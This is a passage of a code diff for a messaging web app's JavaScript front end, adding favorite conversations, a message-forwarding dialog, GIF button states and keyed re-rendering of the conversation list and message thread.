+    const favorites = (convos || [])
+      .filter(conversationFavoriteOf)
+      .slice()
+      .sort((a, b) => (b.LastMessageTS || 0) - (a.LastMessageTS || 0));
+
+    if (!favorites.length) {
+      $favoritesRail.hidden = true;
+      $favoritesRail.innerHTML = '';
+      return;
+    }
+
+    $favoritesRail.hidden = false;
+    $favoritesRail.innerHTML = favorites.map((convo) => {
+      const avatarRefs = conversationAvatarRefs(convo);
+      const unread = Number(convo.UnreadCount || convo.unread_count || 0);
+      const unreadLabel = unread > 99 ? '99+' : String(unread);
+      const labelName = convo.Name || 'favorite thread';
+      const unreadAria = unread > 0 ? `, ${unreadLabel} unread` : '';
+      return `
+        <button
+          type="button"
+          class="favorite-chip${convo.ConversationID === activeConvoId ? ' active' : ''}"
+          data-conversation-id="${escapeHtml(convo.ConversationID)}"
+          title="${escapeHtml(labelName)}"
+          aria-label="${escapeHtml(`Open ${labelName}${unreadAria}`)}"
+          ${convo.ConversationID === activeConvoId ? 'aria-current="page"' : ''}
+        >
+          ${avatarHTML({
+            name: convo.Name,
+            numbers: conversationAvatarNumbers(convo),
+            whatsAppConversationID: conversationAvatarWhatsAppConversationID(convo),
+            avatarSource: avatarRefs.source,
+            participantIDs: avatarRefs.participantIDs,
+            contactIDs: avatarRefs.contactIDs,
+            platforms: avatarPlatformsForConversation(convo),
+            className: 'favorite-avatar',
+            style: `background:${avatarColor(convo.Name)}`,
+          })}
+          ${unread > 0 ? `<span class="favorite-unread" aria-hidden="true">${escapeHtml(unreadLabel)}</span>` : ''}
+        </button>
+      `;
+    }).join('');
+
+    $favoritesRail.querySelectorAll('.favorite-chip').forEach((btn) => {
+      btn.addEventListener('click', async () => {
+        const convo = conversationByID(btn.dataset.conversationId || '');
+        if (convo) {
+          await revealAndSelectConversation(convo);
+        }
+      });
+    });
+    hydrateNativeAvatars($favoritesRail);
+  }
+
   function updateChatHeaderPlatform(protocolDetail = '') {
     activeProtocolDetail = protocolDetail || displayProtocolOf(activeConversation);
     if (!activeConversation) {
@@ -6633,6 +7363,7 @@ body::after {
       await selectConversation(route);
     });
     const notificationMode = notificationModeOf(activeConversation);
+    const isFavorite = conversationFavoriteOf(activeConversation);
     const leaveButtonHTML = isLeaveableWhatsAppGroup(activeConversation)
       ? `
       <button
@@ -6653,6 +7384,14 @@ body::after {
         title="Notification settings: ${escapeHtml(notificationModeLabel(notificationMode))}"
         aria-label="Notification settings"
       >${notificationActionIconHTML(notificationMode)}</button>
+      <button
+        type="button"
+        class="chat-header-action-btn favorite${isFavorite ? ' active' : ''}"
+        id="chat-header-favorite-btn"
+        title="${isFavorite ? 'Remove from favorites' : 'Add to favorites'}"
+        aria-label="Favorite thread"
+        aria-pressed="${isFavorite ? 'true' : 'false'}"
+      >${favoriteActionIconHTML(isFavorite)}</button>
     `;
     const $leaveGroupBtn = document.getElementById('chat-header-leave-group-btn');
     if ($leaveGroupBtn) {
@@ -6674,6 +7413,15 @@ body::after {
         });
       });
     }
+    const $favoriteBtn = document.getElementById('chat-header-favorite-btn');
+    if ($favoriteBtn) {
+      $favoriteBtn.addEventListener('click', () => {
+        toggleConversationFavorite(activeConversation).catch(err => {
+          console.error('Failed to update favorite:', err);
+          showThreadFeedback(err.message || 'Failed to update favorite.');
+        });
+      });
+    }
     const details = [];
     if (activeConversation.IsGroup) details.push('Group chat');
     const typingText = typingStatusText(activeConversation);
@@ -6685,8 +7433,10 @@ body::after {
     if (!activeConversation) {
       $composeInput.disabled = false;
       if ($composeEmojiBtn) $composeEmojiBtn.disabled = false;
-      $attachBtn.disabled = false;
+      if ($composeGifBtn) $composeGifBtn.disabled = composeSendInFlight;
+      $attachBtn.disabled = composeSendInFlight;
       $attachBtn.title = 'Attach media';
+      if ($composeGifBtn) $composeGifBtn.title = 'Search GIFs';
       return;
     }
 
@@ -6694,12 +7444,20 @@ body::after {
     const canSendMedia = conversationSupportsMediaOutbound(activeConversation);
     $composeInput.disabled = !canSend;
     if ($composeEmojiBtn) $composeEmojiBtn.disabled = !canSend;
-    $attachBtn.disabled = !canSendMedia;
+    if ($composeGifBtn) $composeGifBtn.disabled = composeSendInFlight || !canSendMedia;
+    $attachBtn.disabled = composeSendInFlight || !canSendMedia;
     $attachBtn.title = canSendMedia
       ? 'Attach media'
       : (sourcePlatformOf(activeConversation) === 'whatsapp'
         ? 'Reconnect WhatsApp to send attachments on this route'
         : 'Attachments unavailable on this route');
+    if ($composeGifBtn) {
+      $composeGifBtn.title = canSendMedia
+        ? 'Search GIFs'
+        : (sourcePlatformOf(activeConversation) === 'whatsapp'
+          ? 'Reconnect WhatsApp to send GIFs on this route'
+          : 'GIFs unavailable on this route');
+    }
     $composeInput.placeholder = canSend ? 'Write a message...' : routeUnavailablePlaceholder(activeConversation);
     if (!canSendMedia && pendingFile) {
       clearAttachment();
@@ -6710,11 +7468,15 @@ body::after {
     if (!canSend) {
       closeComposeEmojiPanel();
     }
+    if (!canSendMedia) {
+      closeComposeGifPanel();
+    }
     autoResize();
   }
 
   function refreshConversationChrome(protocolDetail = activeProtocolDetail) {
     updateChatHeaderPlatform(protocolDetail);
+    renderFavoritesRail();
     refreshComposeRouteUI();
   }
 
@@ -7044,13 +7806,20 @@ body::after {
       || null;
   }
 
-  function applyConversationPatch(conversationID, patch) {
-    const apply = (convo) => {
+  function applyConversationPatch(conversationID, patch, fallbackConvo = null) {
+    let patchedAllConversations = false;
+    allConversations = allConversations.map((convo) => {
+      if (!convo || convo.ConversationID !== conversationID) return convo;
+      patchedAllConversations = true;
+      return Object.assign(convo, patch);
+    });
+    conversations = conversations.map((convo) => {
       if (!convo || convo.ConversationID !== conversationID) return convo;
       return Object.assign(convo, patch);
-    };
-    allConversations = allConversations.map(apply);
-    conversations = conversations.map(apply);
+    });
+    if (!patchedAllConversations && fallbackConvo && conversationFavoriteOf(Object.assign({}, fallbackConvo, patch))) {
+      allConversations.push(Object.assign({}, fallbackConvo, patch));
+    }
     if (activeConversation && activeConversation.ConversationID === conversationID) {
       activeConversation = Object.assign(activeConversation, patch);
     }
@@ -7121,6 +7890,28 @@ body::after {
     if (activeConversation && activeConversation.ConversationID === convo.ConversationID) {
       refreshConversationChrome();
     }
+  }
+
+  async function setConversationFavorite(convo, favorite) {
+    if (!convo) return;
+    const updated = await postJSON(`/api/conversations/${encodeURIComponent(convo.ConversationID)}/favorite`, {
+      favorite: !!favorite,
+    });
+    const isFavorite = favoriteValueFromResponse(updated, favorite);
+    const patch = {
+      IsFavorite: isFavorite,
+      is_favorite: isFavorite,
+    };
+    applyConversationPatch(convo.ConversationID, patch, Object.assign({}, convo, updated));
+    await renderConversationListPreservingSearch();
+    if (activeConversation && activeConversation.ConversationID === convo.ConversationID) {
+      refreshConversationChrome();
+    }
+  }
+
+  async function toggleConversationFavorite(convo) {
+    if (!convo) return;
+    await setConversationFavorite(convo, !conversationFavoriteOf(convo));
   }
 
   async function leaveWhatsAppGroup(convo = activeConversation) {
@@ -7250,10 +8041,15 @@ body::after {
   }
 
   function conversationContextMenuItems(convo) {
+    const isFavorite = conversationFavoriteOf(convo);
     const items = [
       {
         label: 'Open thread',
         action: 'open-thread',
+      },
+      {
+        label: isFavorite ? 'Remove from favorites' : 'Add to favorites',
+        action: 'toggle-favorite',
       },
     ];
     if (isLeaveableWhatsAppGroup(convo)) {
@@ -7291,6 +8087,11 @@ body::after {
         action: 'reply-message',
       },
       {
+        label: 'Forward',
+        action: 'forward-message',
+        disabled: !messageHasForwardableContent(message),
+      },
+      {
         label: 'Copy text',
         action: 'copy-message',
         disabled: !String(message && message.Body || '').trim(),
@@ -7305,6 +8106,211 @@ body::after {
         action: 'copy-link',
       } : null,
     ];
+  }
+
+  function closeForwardDialog() {
+    forwardMessage = null;
+    forwarding = false;
+    if (!$forwardOverlay) return;
+    $forwardOverlay.hidden = true;
+    if ($forwardSearch) {
+      $forwardSearch.value = '';
+      $forwardSearch.disabled = false;
+    }
+    if ($forwardList) $forwardList.innerHTML = '';
+    if ($forwardStatus) {
+      $forwardStatus.textContent = '';
+      $forwardStatus.classList.remove('error');
+    }
+  }
+
+  function forwardTargetSearchText(convo) {
+    const participants = conversationParticipants(convo)
+      .flatMap(p => [p && p.name, p && p.number, p && p.phone, p && p.email])
+      .filter(Boolean)
+      .join(' ');
+    return [
+      convo && convo.Name,
+      routeDisplayLabel(convo),
+      conversationPreviewText(convo),
+      participants,
+    ].filter(Boolean).join(' ').toLowerCase();
+  }
+
+  function forwardTargetConversations(message) {
+    const needsMedia = !!(message && message.MediaID);
+    return sortRoutesByRecency(allConversations)
+      .filter(convo => convo && convo.ConversationID)
+      .filter(convo => conversationSupportsOutbound(convo))
+      .filter(convo => !needsMedia || conversationSupportsMediaOutbound(convo));
+  }
+
+  function setForwardStatus(message, isError = false) {
+    if (!$forwardStatus) return;
+    $forwardStatus.textContent = message || '';
+    $forwardStatus.classList.toggle('error', !!isError);
+  }
+
+  function setForwardBusy(isBusy) {
+    forwarding = !!isBusy;
+    if ($forwardSearch) $forwardSearch.disabled = forwarding;
+    if ($forwardList) {
+      $forwardList.querySelectorAll('.forward-target').forEach(btn => {
+        btn.disabled = forwarding;
+      });
+    }
+  }
+
+  function renderForwardTargets() {
+    if (!$forwardList || !forwardMessage) return;
+    const query = String($forwardSearch && $forwardSearch.value || '').trim().toLowerCase();
+    const targets = forwardTargetConversations(forwardMessage)
+      .filter(convo => !query || forwardTargetSearchText(convo).includes(query))
+      .slice(0, 80);
+    if (!targets.length) {
+      const emptyCopy = forwardMessage.MediaID
+        ? 'No media-capable conversations match that search.'
+        : 'No sendable conversations match that search.';
+      $forwardList.innerHTML = `<div class="forward-empty">${escapeHtml(emptyCopy)}</div>`;
+      return;
+    }
+    $forwardList.innerHTML = '';
+    targets.forEach(convo => {
+      const btn = document.createElement('button');
+      const avatarRefs = conversationAvatarRefs(convo);
+      btn.type = 'button';
+      btn.className = 'forward-target';
+      btn.dataset.conversationId = convo.ConversationID;
+      btn.innerHTML = `
+        ${avatarHTML({
+          name: convo.Name,
+          numbers: conversationAvatarNumbers(convo),
+          whatsAppConversationID: conversationAvatarWhatsAppConversationID(convo),
+          avatarSource: avatarRefs.source,
+          participantIDs: avatarRefs.participantIDs,
+          contactIDs: avatarRefs.contactIDs,
+          platforms: avatarPlatformsForConversation(convo),
+          className: 'forward-avatar',
+          style: `background:${avatarColor(convo.Name)}`,
+        })}
+        <div class="forward-target-main">
+          <div class="forward-target-name">${escapeHtml(convo.Name || 'Unknown')}</div>
+          <div class="forward-target-meta">
+            ${platformBadgeHTML(displayPlatformForRoute(convo))}
+            <span class="forward-target-preview">${escapeHtml(truncateOneLine(conversationPreviewText(convo), 72))}</span>
+          </div>
+        </div>
+      `;
+      btn.addEventListener('click', () => {
+        const selectedMessage = forwardMessage;
+        forwardMessageToConversation(selectedMessage, convo).catch(err => {
+          console.error('Forward failed:', err);
+          setForwardStatus(userFacingErrorMessage(err, 'send') || 'Forward failed.', true);
+          setForwardBusy(false);
+        });
+      });
+      $forwardList.appendChild(btn);
+    });
+    hydrateNativeAvatars($forwardList);
+  }
+
+  function openForwardDialog(message) {
+    if (!messageHasForwardableContent(message)) {
+      showThreadFeedback('Nothing to forward from this message.');
+      return;
+    }
+    forwardMessage = message;
+    if ($forwardPreview) $forwardPreview.textContent = forwardPreviewText(message);
+    if ($forwardOverlay) $forwardOverlay.hidden = false;
+    setForwardStatus('');
+    if ($forwardSearch) {
+      $forwardSearch.value = '';
+      $forwardSearch.disabled = false;
+    }
+    renderForwardTargets();
+    requestAnimationFrame(() => {
+      if ($forwardSearch) $forwardSearch.focus();
+    });
+  }
+
+  async function mediaBlobForForward(message) {
+    const response = await fetch(`/api/media/${encodeURIComponent(message.MessageID)}`);
+    if (!response.ok) {
+      throw new Error(await responseError(response));
+    }
+    let blob = await response.blob();
+    const mime = (blob.type || message.MimeType || 'application/octet-stream').split(';')[0] || 'application/octet-stream';
+    if (!blob.type) {
+      blob = new Blob([await blob.arrayBuffer()], { type: mime });
+    }
+    return { blob, mime };
+  }
+
+  async function forwardMessageToConversation(message, targetConvo) {
+    if (!message || !targetConvo || forwarding) return;
+    if (browserIsOffline()) {
+      setForwardStatus(offlineFeedbackMessage('send'), true);
+      return;
+    }
+    if (!conversationSupportsOutbound(targetConvo)) {
+      setForwardStatus(routeUnavailableMessage('forward messages', targetConvo), true);
+      return;
+    }
+    if (message.MediaID && !conversationSupportsMediaOutbound(targetConvo)) {
+      setForwardStatus('Attachments are unavailable on that route right now.', true);
+      return;
+    }
+
+    const body = forwardableBody(message);
+    const targetID = targetConvo.ConversationID;
+    const targetPlatform = sourcePlatformOf(targetConvo);
+    const targetName = targetConvo.Name || 'conversation';
+    setForwardBusy(true);
+    setForwardStatus(`Forwarding to ${targetName}...`);
+
+    try {
+      if (message.MediaID) {
+        const { blob, mime } = await mediaBlobForForward(message);
+        const form = new FormData();
+        form.append('conversation_id', targetID);
+        form.append('file', blob, forwardFilename(message, mime));
+        const captionedWhatsAppMedia = targetPlatform === 'whatsapp' && !mime.toLowerCase().startsWith('audio/');
+        const captionedMedia = captionedWhatsAppMedia || targetPlatform === 'signal';
+        if (body && captionedMedia) {
+          form.append('caption', body);
+        }
+        const mediaResponse = await fetch('/api/send-media', { method: 'POST', body: form });
+        if (!mediaResponse.ok) {
+          throw new Error(await responseError(mediaResponse));
+        }
+        if (body && !captionedMedia) {
+          await postJSON('/api/send', {
+            conversation_id: targetID,
+            message: body,
+          });
+        }
+      } else if (body) {
+        await postJSON('/api/send', {
+          conversation_id: targetID,
+          message: body,
+        });
+      } else {
+        throw new Error('Nothing to forward from this message.');
+      }
+
+      closeForwardDialog();
+      showThreadFeedback(`Forwarded to ${targetName}.`);
+      try {
+        if (activeConvoId === targetID) {
+          await loadMessages(targetID, {poll: true, forceBottom: true});
+        }
+        await loadConversations();
+      } catch (refreshErr) {
+        console.error('Failed to refresh after forwarding:', refreshErr);
+      }
+    } finally {
+      setForwardBusy(false);
+    }
   }
 
   function isSameDay(ms1, ms2) {
@@ -7534,19 +8540,61 @@ body::after {
     console.warn('Reconnecting event stream:', reason, `(retry in ${Math.round(delay)}ms)`);
   }
 
+  function setKeyedRenderMetadata(el, key, signature) {
+    if (!el) return el;
+    el.dataset.renderKey = key;
+    el.dataset.renderSignature = signature;
+    return el;
+  }
+
+  function reconcileKeyedChildren(container, renderItems) {
+    if (!container) return [];
+    const existingByKey = new Map();
+    Array.from(container.children).forEach(child => {
+      const key = child.dataset ? child.dataset.renderKey : '';
+      if (key && !existingByKey.has(key)) {
+        existingByKey.set(key, child);
+      }
+    });
+
+    const desiredNodes = renderItems.map(item => {
+      const existing = existingByKey.get(item.key);
+      const node = existing && existing.dataset.renderSignature === item.signature
+        ? existing
+        : item.create();
+      return setKeyedRenderMetadata(node, item.key, item.signature);
+    });
+    const desiredSet = new Set(desiredNodes);
+    let cursor = container.firstElementChild;
+    desiredNodes.forEach(node => {
+      if (node === cursor) {
+        cursor = cursor.nextElementSibling;
+        return;
+      }
+      container.insertBefore(node, cursor);
+    });
+    Array.from(container.children).forEach(child => {
+      if (!desiredSet.has(child)) {
+        child.remove();
+      }
+    });
+    return desiredNodes;
+  }
+
   // ─── Render Conversations ───
   function renderConversations(convos, isSearch) {
     if (!isSearch) {
       allConversations = convos;
     }
+    renderFavoritesRail();
     renderEmptyState();
     renderTabs();
     const tabConvos = isSearch ? convos : filterConversationsByTab(convos);
     renderPlatformFilters(tabConvos);
     const visibleConvos = filterConversationsByPlatform(tabConvos);
     conversations = visibleConvos;
-    $convoList.innerHTML = '';
     if (!visibleConvos.length) {
+      $convoList.innerHTML = '';
       let emptyMsg = isSearch ? 'No results found' : 'No conversations yet';
       if (!isSearch && currentTab) {
         emptyMsg = currentTab === TAB_ARCHIVE
@@ -7561,17 +8609,47 @@ body::after {
       return;
     }
     const renderItems = buildConversationRenderItems(visibleConvos, isSearch);
-    renderItems.forEach(item => {
-      if (item.type === 'contact') {
-        $convoList.appendChild(createContactRow(item.identity, item.convos));
-        return;
-      }
-      $convoList.appendChild(createConversationRow(item.convo));
-    });
+    const keyedItems = renderItems.map((item, index) => conversationListRenderItem(item, index, !!isSearch));
+    reconcileKeyedChildren($convoList, keyedItems);
     hydrateNativeAvatars($convoList);
 
     // Update page title with total unread count
     updateTitleUnreadCount(convos);
+  }
+
+  function conversationListRenderItem(item, index, isSearch) {
+    if (item.type === 'contact') {
+      const key = `contact:${item.identity.key || index}`;
+      const routes = sortRouteConversations(item.convos || []);
+      return {
+        key,
+        signature: [
+          'contact',
+          key,
+          activeConversationIdentityKey(),
+          selectionMode ? 'selecting' : 'normal',
+          isSearch ? 'search' : 'list',
+          JSON.stringify(item.identity || {}),
+          JSON.stringify(routes || []),
+        ].join('::'),
+        create: () => createContactRow(item.identity, item.convos),
+      };
+    }
+    const convo = item.convo || {};
+    const key = `conversation:${convo.ConversationID || index}`;
+    return {
+      key,
+      signature: [
+        'conversation',
+        key,
+        activeConvoId || '',
+        selectionMode ? 'selecting' : 'normal',
+        selectedIds.has(convo.ConversationID) ? 'selected' : 'unselected',
+        isSearch ? 'search' : 'list',
+        JSON.stringify(convo),
+      ].join('::'),
+      create: () => createConversationRow(convo),
+    };
   }
 
   function escapeHtml(str) {
@@ -8188,6 +9266,310 @@ body::after {
     ta.style.height = Math.max(42, ta.scrollHeight) + 'px';
   }
 
+  function threadDateBucket(timestampMS) {
+    const d = new Date(Number(timestampMS || 0));
+    return `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
+  }
+
+  function threadDateDividerRenderItem(timestampMS) {
+    const key = `date:${threadDateBucket(timestampMS)}`;
+    const label = formatDateDivider(timestampMS);
+    return {
+      key,
+      signature: `${key}:${label}`,
+      create: () => {
+        const divider = document.createElement('div');
+        divider.className = 'date-divider';
+        divider.textContent = label;
+        return divider;
+      },
+    };
+  }
+
+  function threadMessageRenderKey(message, index) {
+    const id = String(message && message.MessageID || '');
+    return `msg:${id || `index-${index}`}`;
+  }
+
+  function threadSystemRenderItem(message, index) {
+    const key = `system:${String(message && message.MessageID || '') || `index-${index}`}`;
+    return {
+      key,
+      signature: `${key}:${messageRenderSignature(message)}`,
+      create: () => {
+        const sysEl = document.createElement('div');
+        sysEl.className = 'system-msg';
+        let sysText = message.Body || '';
+        if ((message.Status || '').includes('RCS')) {
+          sysText = '\uD83D\uDD12 ' + sysText;
+        } else if ((message.Status || '').includes('TEXT') || (message.Status || '').includes('SMS')) {
+          sysText = '\uD83D\uDCAC ' + sysText;
+        }
+        sysEl.textContent = sysText;
+        return sysEl;
+      },
+    };
+  }
+
+  function replyPreviewRenderSignature(message, messagesByID) {
+    if (!message || !message.ReplyToID) return '';
+    const original = messagesByID.get(String(message.ReplyToID || ''));
+    if (!original) return 'missing';
+    return [
+      original.SenderName || 'You',
+      original.Body || 'Media',
+      original.MediaID || '',
+      original.MimeType || '',
+    ].join(':');
+  }
+
+  function groupAvatarRenderSignature(message, nextMessage) {
+    if (!activeConvoIsGroup || !message || message.IsFromMe || !message.SenderName) return '';
+    if (!nextMessage) return 'last';
+    return [
+      nextMessage.IsFromMe ? 'me' : 'other',
+      nextMessage.SenderName || '',
+      nextMessage.Status || '',
+      isSameDay(message.TimestampMS, nextMessage.TimestampMS) ? 'same-day' : 'new-day',
+    ].join(':');
+  }
+
+  function threadMessageRenderSignature(message, context) {
+    return [
+      messageRenderSignature(message),
+      context.showMixedSourceChips ? 'mixed-source' : 'single-source',
+      activeConvoIsGroup ? 'group' : 'direct',
+      replyPreviewRenderSignature(message, context.messagesByID),
+      groupAvatarRenderSignature(message, context.nextMessage),
+    ].join('::');
+  }
+
+  function buildThreadMessageNode(message, context) {
+    const allMsgs = context.allMsgs;
+    const absoluteMessageIndex = context.absoluteMessageIndex;
+    const messagesByID = context.messagesByID;
+    const el = document.createElement('div');
+    el.className = 'msg ' + (message.IsFromMe ? 'sent' : 'received');
+
+    let html = '';
+
+    if (message.ReplyToID) {
+      const original = messagesByID.get(String(message.ReplyToID || ''));
+      const origName = original ? (original.SenderName || 'You') : '';
+      const origBody = original ? (original.Body || 'Media') : 'Original message';
+      const truncBody = origBody.length > 60 ? origBody.substring(0, 60) + '\u2026' : origBody;
+      html += `<div class="msg-reply-preview" data-reply-id="${escapeHtml(message.ReplyToID)}" onclick="scrollToMessage('${escapeHtml(message.ReplyToID)}')"><span class="reply-author">${escapeHtml(origName)}</span><span class="reply-body">${escapeHtml(truncBody)}</span></div>`;
+    }
+
+    if (activeConvoIsGroup && !message.IsFromMe && message.SenderName) {
+      html += `<div class="msg-sender" style="color:${avatarColor(message.SenderName)}">${escapeHtml(message.SenderName)}</div>`;
+    }
+    if (context.showMixedSourceChips) {
+      html += `<div class="msg-source-row">${platformBadgeHTML(sourcePlatformOf(message))}</div>`;
+    }
+    if (message.MediaID || message.MimeType) {
+      const mimeType = (message.MimeType || '').toLowerCase();
+      const isImage = mimeType.startsWith('image/');
+      const isAudio = mimeType.startsWith('audio/');
+      const isVideo = mimeType.startsWith('video/');
+      const hasMediaID = !!message.MediaID;
+      const mediaSrc = `/api/media/${encodeURIComponent(message.MessageID)}`;
+      const audioLabel = (message.Body === '[Voice note]' || message.Body === '[Audio]' || !message.Body) ? (message.Body === '[Voice note]' ? 'Voice note' : 'Audio message') : '';
+      const transcript = message.Transcript || message.transcript || '';
+      const transcriptModel = message.TranscriptModel || message.transcript_model || '';
+
+      if (hasMediaID && isImage) {
+        html += `<div class="msg-media">`;
+        html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(message.MessageID)}" data-kind="image"><div class="spinner"></div><span class="msg-media-loading-text">Fetching image...</span></div>`;
+        html += `<img src="${mediaSrc}" alt="Image" loading="lazy" decoding="async" onload="handleMediaLoad(this)" onerror="handleMediaError(this, 'image')" onclick="showFullscreen(this.src,'image')">`;
+        html += `</div>`;
+      } else if (hasMediaID && isAudio) {
+        html += `<div class="msg-media">`;
+        if (audioLabel) {
+          html += `<div class="msg-audio-label">${escapeHtml(audioLabel)}</div>`;
+        }
+        html += `<audio src="${mediaSrc}" controls preload="metadata"></audio>`;
+        if (transcript) {
+          html += `<div class="msg-transcript" title="${escapeHtml(transcriptModel || 'auto-transcribed')}">${escapeHtml(transcript)}</div>`;
+        }
+        html += `</div>`;
+      } else if (hasMediaID && isVideo) {
+        html += `<div class="msg-media">`;
+        html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(message.MessageID)}" data-kind="video"><div class="spinner"></div><span class="msg-media-loading-text">Fetching video...</span></div>`;
+        html += `<video src="${mediaSrc}" preload="none" controls playsinline style="display:none" onloadeddata="this.style.display='block';handleMediaLoad(this)" onerror="handleMediaError(this, 'video')" onclick="event.stopPropagation()"></video>`;
+        html += `</div>`;
+      } else if (!hasMediaID && (isImage || isAudio || isVideo)) {
+        const icon = isImage ? '\uD83D\uDDBC\uFE0F' : (isAudio ? '\uD83C\uDFA4' : '\uD83C\uDFA5');
+        const label = isImage ? 'Image' : (isAudio ? 'Audio' : 'Video');
+        html += `<div style="padding:12px;background:var(--bg-tertiary, #f0f0f0);border-radius:8px;text-align:center;color:var(--text-muted, #999);font-size:13px">${icon} ${label} from phone</div>`;
+      } else if (hasMediaID) {
+        html += `<div style="font-size:13px;color:var(--text-secondary);padding:6px 0">Attachment: ${escapeHtml(message.MimeType || 'file')}</div>`;
+      } else {
+        html += `<div style="font-size:13px;color:var(--text-muted);padding:6px 0">Attachment (${escapeHtml(message.MimeType || 'file')})</div>`;
+      }
+    }
+    const previewURL = message.Body ? extractMessageURLs(message.Body)[0] : '';
+    const shouldHideGenericMediaBody = !!message.MediaID && isGenericMediaBody(message.Body);
+    if (message.Body && !shouldHideGenericMediaBody) {
+      html += `<div class="msg-body">${linkifyMessageBody(message.Body)}</div>`;
+      if (previewURL) {
+        html += `<div class="msg-link-preview-shell" data-preview-url="${escapeHtml(previewURL)}"></div>`;
+      }
+    }
+    if (!message.Body && !message.MediaID) {
+      html += `<div class="msg-body" style="color:var(--text-muted);font-style:italic">Empty message</div>`;
+    }
+
+    if (message.Reactions) {
+      try {
+        const reactions = JSON.parse(message.Reactions);
+        if (reactions.length > 0) {
+          html += '<div class="msg-reactions">';
+          reactions.forEach(r => {
+            const count = Number(r.count) || 0;
+            const emoji = escapeHtml(r.emoji || '');
+            const tip = escapeHtml(reactionTooltip(r, activeConversation));
+            html += `<span class="reaction-pill" title="${tip}">${emoji}<span class="reaction-count">${count > 1 ? count : ''}</span></span>`;
+          });
+          html += '</div>';
+        }
+      } catch(e) {}
+    }
+
+    html += `<div class="msg-time">${formatMessageTime(message.TimestampMS)}${message.IsFromMe ? formatStatusIndicator(message.Status) : ''}</div>`;
+    html += `<div class="msg-actions">`;
+    html += `<button class="action-react" title="React"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg></button>`;
+    html += `<button class="action-reply" title="Reply"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 17 4 12 9 7"/><path d="M20 18v-2a4 4 0 0 0-4-4H4"/></svg></button>`;
+    html += `<button class="action-forward" title="Forward" aria-label="Forward message" ${messageHasForwardableContent(message) ? '' : 'disabled'}><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 17 20 12 15 7"/><path d="M4 18v-2a4 4 0 0 1 4-4h12"/><polyline points="13 6 18 1 23 6"/><path d="M11 12h7"/></svg></button>`;
+    html += `</div>`;
+
+    const safeMsgId = escapeHtml(message.MessageID);
+    html += `<div class="emoji-picker" id="emoji-${safeMsgId}">`;
+    QUICK_EMOJIS.forEach(e => {
+      const safeEmoji = escapeHtml(e);
+      html += `<button onclick="sendReaction('${safeMsgId}','${safeEmoji}')">${safeEmoji}</button>`;
+    });
+    html += `<button class="emoji-plus" data-msg-id="${safeMsgId}" onclick="toggleFullEmojiPanel(event, '${safeMsgId}')">+</button>`;
+    html += '</div>';
+    html += `<div class="emoji-full-panel" id="emoji-full-${safeMsgId}"></div>`;
+
+    el.innerHTML = html;
+    el.dataset.msgId = message.MessageID;
+
+    el.querySelector('.action-react').addEventListener('click', (e) => {
+      e.stopPropagation();
+      document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
+      const picker = document.getElementById('emoji-' + message.MessageID);
+      if (picker) picker.classList.toggle('show');
+    });
+    el.querySelector('.action-reply').addEventListener('click', (e) => {
+      e.stopPropagation();
+      setReplyTo(message);
+    });
+    el.querySelector('.action-forward').addEventListener('click', (e) => {
+      e.stopPropagation();
+      openForwardDialog(message);
+    });
+    el.addEventListener('contextmenu', (event) => {
+      openContextMenu(event, messageContextMenuItems(message), { type: 'message', message });
+    });
+
+    if (activeConvoIsGroup && !message.IsFromMe && message.SenderName) {
+      const nextMsg = allMsgs[absoluteMessageIndex + 1];
+      const isLastFromSender = !nextMsg || nextMsg.IsFromMe || nextMsg.SenderName !== message.SenderName ||
+        (nextMsg.Status || '').startsWith('TOMBSTONE_') || !isSameDay(message.TimestampMS, nextMsg.TimestampMS);
+
+      const row = document.createElement('div');
+      row.className = 'msg-row received';
+      const avatarDiv = document.createElement('div');
+      avatarDiv.className = 'msg-avatar' + (isLastFromSender ? '' : ' avatar-hidden');
+      const avatarRefs = senderAvatarRefs(message);
+      renderAvatarElement(avatarDiv, {
+        name: message.SenderName,
+        numbers: uniqueAvatarNumbers([message.SenderNumber]),
+        whatsAppConversationID: senderAvatarWhatsAppConversationID(message),
+        avatarSource: avatarRefs.source,
+        participantIDs: avatarRefs.participantIDs,
+        contactIDs: avatarRefs.contactIDs,
+        text: initials(message.SenderName).charAt(0),
+        background: avatarColor(message.SenderName),
+      });
+      row.appendChild(avatarDiv);
+      row.appendChild(el);
+      return row;
+    }
+    return el;
+  }
+
+  function buildThreadDraftNode(draft, canSendActiveRoute, draftTextareasToAutosize) {
+    const draftEl = document.createElement('div');
+    draftEl.className = 'draft-banner';
+    draftEl.dataset.draftId = String(draft.DraftID || '');
+    draftEl.innerHTML = `
+      <div class="draft-label">AI Draft</div>
+      <textarea class="draft-text" rows="2"></textarea>
+      <div class="draft-actions">
+        <button class="draft-discard-btn" onclick="discardDraft('${escapeHtml(draft.DraftID)}')">Discard</button>
+        <button class="draft-send-btn" onclick="sendDraft('${escapeHtml(draft.DraftID)}', this)" ${canSendActiveRoute ? '' : `disabled title="${escapeHtml(routeUnavailableMessage('send drafts', activeConversation))}"`}>Send</button>
+      </div>
+    `;
+    const ta = draftEl.querySelector('textarea');
+    ta.value = draftDisplayBody(draft);
+    draftTextareasToAutosize.push(ta);
+    ta.addEventListener('input', () => {
+      draftEdits.set(String(draft.DraftID || ''), ta.value);
+      autosizeDraftTextarea(ta);
+    });
+    return draftEl;
+  }
+
+  function buildThreadRenderItems(renderWindow, allMsgs, drafts, showMixedSourceChips, canSendActiveRoute, messagesByID, draftTextareasToAutosize) {
+    const items = [];
+    let lastDate = 0;
+    renderWindow.messages.forEach((message, index) => {
+      const absoluteMessageIndex = renderWindow.start + index;
+      if (!isSameDay(message.TimestampMS, lastDate)) {
+        items.push(threadDateDividerRenderItem(message.TimestampMS));
+        lastDate = message.TimestampMS;
+      }
+      if ((message.Status || '').startsWith('TOMBSTONE_')) {
+        items.push(threadSystemRenderItem(message, absoluteMessageIndex));
+        return;
+      }
+      const context = {
+        allMsgs,
+        absoluteMessageIndex,
+        messagesByID,
+        showMixedSourceChips,
